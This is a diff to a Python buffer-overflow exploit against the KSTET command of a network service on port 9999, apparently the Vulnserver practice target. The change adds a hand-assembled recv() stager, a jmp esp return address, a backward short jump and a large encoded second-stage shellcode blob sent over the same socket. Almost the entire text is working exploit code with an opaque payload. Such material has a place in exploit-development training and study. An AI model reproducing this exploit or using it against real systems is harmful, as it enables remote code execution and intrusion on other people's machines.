@@ -1,15 +1,60 @@
+# stager 
 import socket, sys
 from struct import pack
+from time import sleep
 
 ip = sys.argv[1]
 port = 9999
 
 prefix = b'KSTET '
-buffer = b'A' * 66
-eip = pack('<L', 0x625012f0) # addr of ff e4 opcode
+
+stager = b"" # int recv(socket s, char *buf, int len, int flags)
+stager += b"\x83\xEC\x70" # sub esp, 0x70
+
+stager += b"\x31\xC0" # xor eax, eax
+stager += b"\x50" # push eax
+
+stager += b"\x80\xC4\x02" # add ah, 0x2
+stager += b"\x50" # push eax
+
+stager += b"\x54" # push esp
+
+# ebx holds socket descriptor
+stager += b"\x53" # push ebx 
+
+# recv at 0x00402550
+stager += b"\xB8\x23\x50\x25\x40" # mov eax, 0x40255023
+stager += b"\xC1\xE8\x08" # shr eax, 0x8
+stager += b"\xFF\xD0" # call recv at eax
+
+buffer = b'\x90' * (66 - len(stager))
+
+shellcode = b"\x90" * 89 
+shellcode += b"\xba\x81\x90\x89\x2a\xda\xc8\xd9\x74\x24\xf4"
+shellcode += b"\x5e\x31\xc9\xb1\x31\x31\x56\x13\x03\x56\x13"
+shellcode += b"\x83\xc6\x85\x72\x7c\xd6\x6d\xf0\x7f\x27\x6d"
+shellcode += b"\x95\xf6\xc2\x5c\x95\x6d\x86\xce\x25\xe5\xca"
+shellcode += b"\xe2\xce\xab\xfe\x71\xa2\x63\xf0\x32\x09\x52"
+shellcode += b"\x3f\xc3\x22\xa6\x5e\x47\x39\xfb\x80\x76\xf2"
+shellcode += b"\x0e\xc0\xbf\xef\xe3\x90\x68\x7b\x51\x05\x1d"
+shellcode += b"\x31\x6a\xae\x6d\xd7\xea\x53\x25\xd6\xdb\xc5"
+shellcode += b"\x3e\x81\xfb\xe4\x93\xb9\xb5\xfe\xf0\x84\x0c"
+shellcode += b"\x74\xc2\x73\x8f\x5c\x1b\x7b\x3c\xa1\x94\x8e"
+shellcode += b"\x3c\xe5\x12\x71\x4b\x1f\x61\x0c\x4c\xe4\x18"
+shellcode += b"\xca\xd9\xff\xba\x99\x7a\x24\x3b\x4d\x1c\xaf"
+shellcode += b"\x37\x3a\x6a\xf7\x5b\xbd\xbf\x83\x67\x36\x3e"
+shellcode += b"\x44\xee\x0c\x65\x40\xab\xd7\x04\xd1\x11\xb9"
+shellcode += b"\x39\x01\xfa\x66\x9c\x49\x16\x72\xad\x13\x7c"
+shellcode += b"\x85\x23\x2e\x32\x85\x3b\x31\x62\xee\x0a\xba"
+shellcode += b"\xed\x69\x93\x69\x4a\x95\x71\xb8\xa6\x3e\x2c"
+shellcode += b"\x29\x0b\x23\xcf\x87\x4f\x5a\x4c\x22\x2f\x99"
+shellcode += b"\x4c\x47\x2a\xe5\xca\xbb\x46\x76\xbf\xbb\xf5"
+shellcode += b"\x77\xea\xdf\x98\xeb\x76\x0e\x3f\x8c\x1d\x4e"
+
+eip = pack('<L', 0x625012f0) # addr of FF E4 opcode (jmp esp)
 jc = b'\xE9\xB5\xFF\xFF\xFF' # jmp 0xffffffba (jump back 70 bytes)
 
-payload = prefix + buffer + eip + jc
+payload = prefix + stager + buffer + eip + jc
 
 try:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -17,6 +62,8 @@ try:
         s.connect((ip, port))
         print('[*] Sending payload')
         s.send(payload)
+        sleep(2)
+        s.send(shellcode)
         s.recv(1024)
 except Exception as e:
     print(e)
